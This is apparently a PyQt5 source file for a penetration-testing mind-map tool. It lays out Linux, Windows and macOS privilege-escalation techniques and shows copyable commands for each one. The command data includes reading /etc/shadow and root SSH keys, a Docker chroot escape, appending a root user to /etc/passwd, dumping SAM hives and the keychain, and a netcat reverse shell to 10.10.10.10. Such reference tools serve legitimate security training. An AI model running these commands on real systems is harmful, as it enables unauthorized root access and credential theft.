import math
from PyQt5.QtWidgets import (QGraphicsView, QGraphicsScene, QGraphicsItem, 
                             QGraphicsPathItem, QVBoxLayout, QWidget, 
                             QComboBox, QHBoxLayout, QPushButton, QDialog,
                             QTextEdit, QLabel, QApplication)
from PyQt5.QtCore import Qt, QRectF, QPointF
from PyQt5.QtGui import QPen, QBrush, QColor, QPainter, QPainterPath, QFont, QLinearGradient, QCursor

# ---------------------------------------------------------
# 1. COMMAND VIEWER DIALOG (The Popup)
# ---------------------------------------------------------
class CommandViewerDialog(QDialog):
    def __init__(self, title, commands, parent=None):
        super().__init__(parent)
        self.setWindowTitle(f"Quick Commands: {title}")
        self.setMinimumSize(600, 400)
        self.setStyleSheet("""
            QDialog { background-color: #1e1e2f; color: white; }
            QLabel { font-size: 14px; font-weight: bold; color: #00d2ff; }
            QTextEdit { 
                background-color: #2b2b3b; color: #a0a0b0; 
                border: 1px solid #444; font-family: 'Consolas', 'Courier New', monospace;
                font-size: 13px; padding: 10px;
            }
            QPushButton {
                background-color: #00d2ff; color: #1e1e2f; font-weight: bold;
                padding: 8px 15px; border-radius: 4px; border: none;
            }
            QPushButton:hover { background-color: #00c0eb; }
        """)

        layout = QVBoxLayout(self)

        # Header
        lbl_header = QLabel(f"Vector: {title}")
        layout.addWidget(lbl_header)

        # Text Area
        self.text_area = QTextEdit()
        self.text_area.setPlainText(commands)
        self.text_area.setReadOnly(True)
        layout.addWidget(self.text_area)

        # Buttons
        btn_layout = QHBoxLayout()
        btn_copy = QPushButton("Copy to Clipboard")
        btn_copy.clicked.connect(self.copy_to_clipboard)
        
        btn_close = QPushButton("Close")
        btn_close.setStyleSheet("background-color: #444; color: white;")
        btn_close.clicked.connect(self.accept)

        btn_layout.addStretch()
        btn_layout.addWidget(btn_copy)
        btn_layout.addWidget(btn_close)
        layout.addLayout(btn_layout)

    def copy_to_clipboard(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.text_area.toPlainText())
        self.text_area.selectAll() # Visual feedback

# ---------------------------------------------------------
# 2. ZOOMABLE GRAPHICS VIEW
# ---------------------------------------------------------
class ZoomableGraphicsView(QGraphicsView):
    def __init__(self, scene, parent=None):
        super().__init__(scene, parent)
        self.setRenderHint(QPainter.Antialiasing)
        self.setDragMode(QGraphicsView.ScrollHandDrag)
        self.setTransformationAnchor(QGraphicsView.AnchorUnderMouse)
        self.setResizeAnchor(QGraphicsView.AnchorUnderMouse)
        self.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.setStyleSheet("border: none; background: transparent;")

    def wheelEvent(self, event):
        zoom_in_factor = 1.15
        zoom_out_factor = 1 / zoom_in_factor
        if event.angleDelta().y() > 0:
            zoom_factor = zoom_in_factor
        else:
            zoom_factor = zoom_out_factor
            
        current_scale = self.transform().m11()
        if current_scale < 0.1 and zoom_factor < 1: return
        if current_scale > 5.0 and zoom_factor > 1: return

        self.scale(zoom_factor, zoom_factor)

# ---------------------------------------------------------
# 3. MIND MAP EDGE
# ---------------------------------------------------------
class MindMapEdge(QGraphicsPathItem):
    def __init__(self, source_node, dest_node):
        super().__init__()
        self.source = source_node
        self.dest = dest_node
        self.setZValue(-1)
        self.pen = QPen(QColor("#555555"), 2)
        self.setPen(self.pen)
        self.update_position()

    def update_position(self):
        if not self.source or not self.dest: return
        start = self.source.get_right_anchor()
        end = self.dest.get_left_anchor()
        path = QPainterPath()
        path.moveTo(start)
        dist = (end.x() - start.x()) / 2
        path.cubicTo(QPointF(start.x() + dist, start.y()), QPointF(end.x() - dist, end.y()), end)
        self.setPath(path)

# ---------------------------------------------------------
# 4. MIND MAP NODE (Updated for Interaction)
# ---------------------------------------------------------
class MindMapNode(QGraphicsItem):
    def __init__(self, text, level=0, commands=None, parent_node=None):
        super().__init__()
        self.text_content = text
        self.level = level 
        self.commands = commands # Store the commands string
        self.parent_node = parent_node
        self.edges_out = []
        self.edge_in = None
        
        self.setFlags(QGraphicsItem.ItemIsMovable | QGraphicsItem.ItemIsSelectable | QGraphicsItem.ItemSendsGeometryChanges)
        self.setAcceptHoverEvents(True)
        
        # Cursor change if actionable
        if self.commands:
            self.setCursor(Qt.PointingHandCursor)
            self.setToolTip("Double-click for commands")

        # Dimensions & Colors
        self.width = 220
        self.height = 60
        
        if level == 0:
            self.base_color = QColor("#00d2ff")
            self.font_size = 14
        elif level == 1:
            self.base_color = QColor("#aa00ff")
            self.font_size = 12
        elif level == 2:
            self.base_color = QColor("#ff007f")
            self.font_size = 10
        else:
            self.base_color = QColor("#555566")
            self.font_size = 10

        self.rect = QRectF(-self.width/2, -self.height/2, self.width, self.height)

    def boundingRect(self):
        return self.rect

    def get_right_anchor(self):
        return self.mapToScene(self.rect.width()/2, 0)

    def get_left_anchor(self):
        return self.mapToScene(-self.rect.width()/2, 0)

    def paint(self, painter, option, widget):
        # Shadow
        painter.setBrush(QColor(0, 0, 0, 80))
        painter.setPen(Qt.NoPen)
        painter.drawRoundedRect(self.rect.translated(4, 4), 10, 10)

        # Gradient
        grad = QLinearGradient(self.rect.topLeft(), self.rect.bottomLeft())
        grad.setColorAt(0, self.base_color.lighter(120))
        grad.setColorAt(1, self.base_color.darker(110))
        painter.setBrush(QBrush(grad))
        
        # Border
        if self.isSelected():
            painter.setPen(QPen(Qt.white, 3))
        elif self.commands: 
            # Subtle hint that this is actionable
            painter.setPen(QPen(QColor("#ccff00"), 1)) 
        else:
            painter.setPen(QPen(QColor("#222"), 1))
            
        painter.drawRoundedRect(self.rect, 10, 10)

        # Text
        painter.setPen(Qt.white)
        painter.setFont(QFont("Arial", self.font_size, QFont.Bold))
        painter.drawText(self.rect, Qt.AlignCenter | Qt.TextWordWrap, self.text_content)
        
        # Optional: Small icon for actionable nodes? 
        # For now, the border and cursor are sufficient indicators.

    def mouseDoubleClickEvent(self, event):
        """Handle double clicks to open command dialog."""
        if self.commands:
            # We need to access QWidget parents to show dialog, or just create it with no parent (top level)
            dlg = CommandViewerDialog(self.text_content, self.commands)
            dlg.exec_()
        super().mouseDoubleClickEvent(event)

    def itemChange(self, change, value):
        if change == QGraphicsItem.ItemPositionHasChanged:
            if self.edge_in: self.edge_in.update_position()
            for edge in self.edges_out: edge.update_position()
        return super().itemChange(change, value)

# ---------------------------------------------------------
# 5. MAIN WIDGET & DATA
# ---------------------------------------------------------
class PrivEscWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(0, 0, 0, 0)
        
        # Toolbar
        self.toolbar = QHBoxLayout()
        self.toolbar.setContentsMargins(10, 10, 10, 0)
        self.combo_os = QComboBox()
        self.combo_os.addItems(["Linux", "Windows", "MacOS"])
        self.combo_os.setStyleSheet("QComboBox { background-color: #2f2f40; color: #00d2ff; padding: 5px; border: 1px solid #444; }")
        self.combo_os.currentIndexChanged.connect(self.load_map)
        
        self.btn_reset = QPushButton("Reset View")
        self.btn_reset.setStyleSheet("QPushButton { background-color: #2f2f40; color: white; border: 1px solid #444; padding: 5px 15px; } QPushButton:hover { border-color: #00d2ff; color: #00d2ff; }")
        self.btn_reset.clicked.connect(self.reset_zoom)

        self.lbl_reminder = QLabel()
        self.lbl_reminder.setStyleSheet("color: #ffcc00; font-weight: bold; margin-left: 20px; font-size: 13px;")
        
        self.toolbar.addWidget(self.combo_os)
        self.toolbar.addWidget(self.btn_reset)
        self.toolbar.addWidget(self.lbl_reminder)
        self.toolbar.addStretch()
        self.layout.addLayout(self.toolbar)

        # View
        self.scene = QGraphicsScene()
        self.scene.setBackgroundBrush(QBrush(QColor("#1e1e2f")))
        self.view = ZoomableGraphicsView(self.scene)
        self.layout.addWidget(self.view)
        
        self.next_y_pos = 0
        self.x_spacing = 300
        self.y_spacing = 80
        self.load_map()

    def reset_zoom(self):
        self.view.resetTransform()
        self.load_map()

    def get_data_for_os(self, os_name):
        """
        Fully populated data structure matching the user's provided Mind Maps.
        Includes actionable commands for every leaf node.
        """
        if os_name == "Linux":
            return {
                "name": "Linux Privilege Escalation",
                "children": [
                    {"name": "Credential Access", "children": [
                        {"name": "Reused Passwords", "commands": "cat /etc/shadow\ncat /etc/passwd\n# Check if user password works for root"},
                        {"name": "Credentials from\nConfiguration Files", "commands": "grep -lRi \"password\" /var/www/html/ 2>/dev/null\ngrep -r \"user\" /etc/ 2>/dev/null\nfind . -name \"*.php\" -print0 | xargs -0 grep -i -n \"var $password\""},
                        {"name": "Credentials from\nLocal Database", "commands": "cat /var/www/html/config.php\n# Check for DB_PASSWORD\nmysql -u root -p -e 'SHOW DATABASES;'"},
                        {"name": "Credentials from\nBash History", "commands": "cat ~/.bash_history\ngrep -i \"pass\" ~/.bash_history\ncat /home/*/.bash_history"},
                        {"name": "SSH Keys", "commands": "find / -name id_rsa 2>/dev/null\nfind / -name authorized_keys 2>/dev/null\ncat /root/.ssh/id_rsa"},
                        {"name": "Sudo Access", "commands": "sudo -l\n# Look for (NOPASSWD)\n# Check GTFOBins for sudo enabled binaries"},
                        {"name": "Group Privileges\n(Docker, LXD, etc)", "commands": "groups\nid\n# Docker: docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# LXD: lxc init ubuntu:18.04 mysecurity -c security.privileged=true"}
                    ]},
                    {"name": "Exploit", "children": [
                        {"name": "Services Running\non Localhost", "commands": "netstat -antup | grep 127.0.0.1\nss -tulpn | grep LISTEN\n# Forward ports using SSH or Chisel to attack locally"},
                        {"name": "Kernel Version", "commands": "uname -a\ncat /proc/version\n# Search exploit-db or use linux-exploit-suggester.sh"},
                        {"name": "Binary File Versions", "commands": "dpkg -l\nrpm -qa\n# Check versions of sudo, screen, tmux, etc."}
                    ]},
                    {"name": "Misconfiguration", "children": [
                        {"name": "Cron Jobs", "children": [
                            {"name": "Writeable Cron Job", "commands": "cat /etc/crontab\nls -la /etc/cron.d\n# Check permissions of scripts listed"},
                            {"name": "Writeable Cron Job\nDependency", "commands": "# Check imports in python scripts run by cron\n# Check libraries referenced in shell scripts\nfind / -writable -type f 2>/dev/null"}
                        ]},
                        {"name": "SUID/SGID Files", "commands": "find / -perm -u=s -type f 2>/dev/null\nfind / -perm -4000 2>/dev/null\n# Cross reference with GTFOBins"},
                        {"name": "Interesting Capabilities\non Binary", "commands": "getcap -r / 2>/dev/null\n# Look for cap_setuid+ep"},
                        {"name": "Sensitive Files\nWriteable", "children": [
                            {"name": "/etc/passwd", "commands": "ls -l /etc/passwd\n# If writable, add user:\n# openssl passwd -1 -salt new user\n# echo 'new:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd"},
                            {"name": "/etc/shadow", "commands": "ls -l /etc/shadow\n# Replace root hash if writable"},
                            {"name": "/etc/sudoers", "commands": "ls -l /etc/sudoers\n# Add 'user ALL=(ALL) NOPASSWD: ALL'"},
                            {"name": "Configuration Files", "commands": "find /etc -writable -type f 2>/dev/null"}
                        ]},
                        {"name": "Sensitive Files\nReadable", "children": [
                            {"name": "/etc/shadow", "commands": "cat /etc/shadow\n# Crack hashes with John/Hashcat"},
                            {"name": "/root/.ssh/id_rsa\n(SSH Private Keys)", "commands": "cat /root/.ssh/id_rsa"}
                        ]},
                        {"name": "Writable PATH", "children": [
                            {"name": "Root $PATH Writable", "commands": "echo $PATH\n# Check if any folder in root's path is writable by you"},
                            {"name": "Directory in PATH\nWriteable", "commands": "find `echo $PATH | tr ':' ' '` -perm -2 -type d 2>/dev/null\n# Hijack binary by placing malicious file in writable path"}
                        ]},
                        {"name": "LD_PRELOAD Set in\n/etc/sudoers", "commands": "sudo -l\n# If env_keep+=LD_PRELOAD:\n# GCC compile shared object -> sudo LD_PRELOAD=/tmp/malicious.so <cmd>"}
                    ]}
                ]
            }
        elif os_name == "Windows":
            return {
                "name": "Windows Privilege Escalation",
                "children": [
                    {"name": "Credential Access", "children": [
                        {"name": "Reused Passwords", "commands": "net user <username>\n# Check if local admin shares password"},
                        {"name": "Credentials from\nConfiguration Files", "commands": "findstr /si password *.xml *.ini *.txt\ndir /s *pass* == *cred* == *vnc* == *.config*"},
                        {"name": "Credentials from\nLocal Database", "commands": "# Check connection strings in web.config or appsettings.json"},
                        {"name": "Credentials from\ncmdkey", "commands": "cmdkey /list\n# If saved creds exist: runas /savecred /user:admin cmd.exe"},
                        {"name": "Credentials from\nRegistry", "commands": "reg query HKLM /f password /t REG_SZ /s\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\""},
                        {"name": "Credentials from\nUnattend or Sysprep", "commands": "dir /b /s c:\\Unattend.xml\ndir /b /s c:\\sysprep.inf"},
                        {"name": "Credentials from\nLog Files", "commands": "findstr /si password *.log"},
                        {"name": "User Groups", "commands": "net localgroup administrators\nnet localgroup \"Remote Desktop Users\""}
                    ]},
                    {"name": "Exploit", "children": [
                        {"name": "Services Running\non Localhost", "commands": "netstat -ano | findstr LISTEN\n# Forward ports to access admin panels"},
                        {"name": "Kernel Version", "commands": "systeminfo\n# Check Hotfixes applied\n# Use Wesng or Windows Exploit Suggester"},
                        {"name": "Software Versions", "commands": "wmic product get name,version,vendor\n# Check for vulnerable 3rd party apps"},
                        {"name": "Service Versions", "commands": "sc query type= service state= all"}
                    ]},
                    {"name": "Misconfiguration", "children": [
                        {"name": "User Privileges", "commands": "whoami /priv\n# Look for SeImpersonatePrivilege (Juicy Potato)\n# Look for SeDebugPrivilege\n# Look for SeBackupPrivilege"},
                        {"name": "Services", "children": [
                            {"name": "Unquoted Service Path", "commands": "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\""},
                            {"name": "Change Service\nBinary Location", "commands": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\n# If SERVICE_CHANGE_CONFIG:\nsc config <service> binpath= \"C:\\nc.exe -e cmd 10.10.10.10 4444\""},
                            {"name": "Overwrite Service\nBinary", "commands": "icacls \"C:\\Path\\To\\Service.exe\"\n# If Write permission, overwrite with malicious exe"},
                            {"name": "DLL Hijacking", "commands": "# Find missing DLLs loaded by services\n# Place malicious DLL in writable folder in PATH"}
                        ]},
                        {"name": "AlwaysInstallElevated\nSet in Registry", "commands": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# If 1, create MSI payload with msfvenom"},
                        {"name": "Scheduled Tasks", "children": [
                            {"name": "Executable File\nWriteable", "commands": "schtasks /query /fo LIST /v\nicacls <task_binary>"},
                            {"name": "Dependency Writeable", "commands": "# Check permissions of scripts/binaries called by the task"}
                        ]},
                        {"name": "Sensitive Files\nReadable", "children": [
                            {"name": "SAM Hive", "commands": "reg save HKLM\\SAM sam.save\n# Pull locally to crack"},
                            {"name": "SYSTEM Hive", "commands": "reg save HKLM\\SYSTEM system.save"}
                        ]}
                    ]}
                ]
            }
        else: # MacOS
             return {
                "name": "MacOS PrivEsc",
                "children": [
                    {"name": "TCC Bypasses", "children": [
                        {"name": "Zoom Installer Exploit", "commands": "# Check for older zoom pkg versions"},
                        {"name": "Symlink / Mount Attacks", "commands": "# CSRutil status"}
                    ]},
                    {"name": "XPC Services", "children": [
                        {"name": "Insecure XPC Endpoints", "commands": "ls /Library/LaunchDaemons"},
                        {"name": "Code Injection via XPC", "commands": "# Monitor XPC messages"}
                    ]},
                     {"name": "Credentials", "children": [
                        {"name": "Keychain Dumping", "commands": "security dump-keychain"},
                        {"name": "Shell History / Profiles", "commands": "cat ~/.zsh_history"}
                    ]}
                ]
            }
    def load_map(self):
        self.scene.clear()
        self.next_y_pos = 0 
        os_name = self.combo_os.currentText()

        if os_name == "Linux":
            self.lbl_reminder.setText("💡 Don't forget: Run LinPEAS.sh first!")
        elif os_name == "Windows":
            self.lbl_reminder.setText("💡 Don't forget: Run WinPEAS.exe first!")
        else:
            self.lbl_reminder.setText("💡 Don't forget: Run automated enum tools.")
            
        data = self.get_data_for_os(os_name)
        root_node = self.create_node_tree(data, level=0)
        self.view.centerOn(root_node)

    def create_node_tree(self, data, level, parent_node=None):
        # Pass commands if they exist in the dict
        commands = data.get("commands", None)
        
        node = MindMapNode(data["name"], level=level, commands=commands, parent_node=parent_node)
        self.scene.addItem(node)

        children_data = data.get("children", [])
        if not children_data:
            x = level * self.x_spacing
            y = self.next_y_pos
            node.setPos(x, y)
            self.next_y_pos += self.y_spacing
        else:
            child_nodes = []
            for child_dict in children_data:
                child = self.create_node_tree(child_dict, level + 1, parent_node=node)
                child_nodes.append(child)
            
            first_child_y = child_nodes[0].pos().y()
            last_child_y = child_nodes[-1].pos().y()
            avg_y = (first_child_y + last_child_y) / 2
            
            x = level * self.x_spacing
            node.setPos(x, avg_y)

            for child in child_nodes:
                edge = MindMapEdge(node, child)
                self.scene.addItem(edge)
                node.edges_out.append(edge)
                child.edge_in = edge
        return node